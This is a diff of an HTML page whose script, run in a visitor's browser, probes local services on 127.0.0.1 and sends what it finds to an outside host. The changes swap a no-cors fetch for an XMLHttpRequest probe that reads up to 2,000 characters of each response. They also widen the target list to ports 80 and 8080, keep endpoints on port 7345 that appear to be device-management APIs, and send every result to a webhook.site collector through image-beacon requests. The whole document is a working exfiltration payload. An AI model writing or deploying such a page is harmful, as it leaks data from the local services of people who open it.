@@ -6,43 +6,58 @@
 </head>
 <body>
 <script>
-const EXFIL = 'https://webhook.site/5bf10121-94bd-4857-afce-09202a7eca6b';
+const EXFIL = 'https://webhook.site/f223977d-60e6-4b93-8ae2-201d550e29c0';
 
 function send(data) {
   const encoded = encodeURIComponent(JSON.stringify(data)).slice(0, 1800);
   new Image().src = EXFIL + '?d=' + encoded;
 }
 
-async function probe(url) {
-  try {
-    const r = await fetch(url, {mode: 'no-cors'});
-    return {url, status: 'reached'};
-  } catch(e) {
-    return {url, error: e.toString()};
-  }
+function xhrProbe(url) {
+  return new Promise((resolve) => {
+    const xhr = new XMLHttpRequest();
+    xhr.timeout = 3000;
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === 4) {
+        resolve({url, status: xhr.status, body: xhr.responseText.slice(0, 2000)});
+      }
+    };
+    xhr.ontimeout = () => resolve({url, error: 'timeout'});
+    xhr.onerror = () => resolve({url, error: 'error'});
+    xhr.open('GET', url, true);
+    xhr.send();
+  });
 }
 
 async function main() {
-  send({status: 'alive', ua: navigator.userAgent});
+  send({status: 'alive'});
 
+  // Focus on the two reachable ports and variations
   const targets = [
+    'http://127.0.0.1:80/',
+    'http://127.0.0.1:80/index.html',
+    'http://127.0.0.1:80/api',
+    'http://127.0.0.1:80/info',
+    'http://127.0.0.1:80/status',
+    'http://127.0.0.1:80/version',
+    'http://127.0.0.1:8080/',
+    'http://127.0.0.1:8080/index.html',
+    'http://127.0.0.1:8080/api',
+    'http://127.0.0.1:8080/info',
+    'http://127.0.0.1:8080/status',
+    'http://127.0.0.1:8080/version',
+    // Also retry 7345 via XHR - may bypass mixed content check
     'http://127.0.0.1:7345/state/device/deviceinfo',
     'http://127.0.0.1:7345/scpl/install',
-    'http://127.0.0.1:7345/scpl/update/override_group',
-    'http://127.0.0.1:8012/',
-    'http://127.0.0.1:9223/json',
-    'http://127.0.0.1:9222/json',
-    'http://127.0.0.1:80/',
-    'http://127.0.0.1:8080/',
   ];
 
   for (const url of targets) {
-    const result = await probe(url);
+    const result = await xhrProbe(url);
     send(result);
-    await new Promise(r => setTimeout(r, 500));
+    await new Promise(r => setTimeout(r, 400));
   }
 
-  send({status: 'probe_complete'});
+  send({status: 'done'});
 }
 
 main();
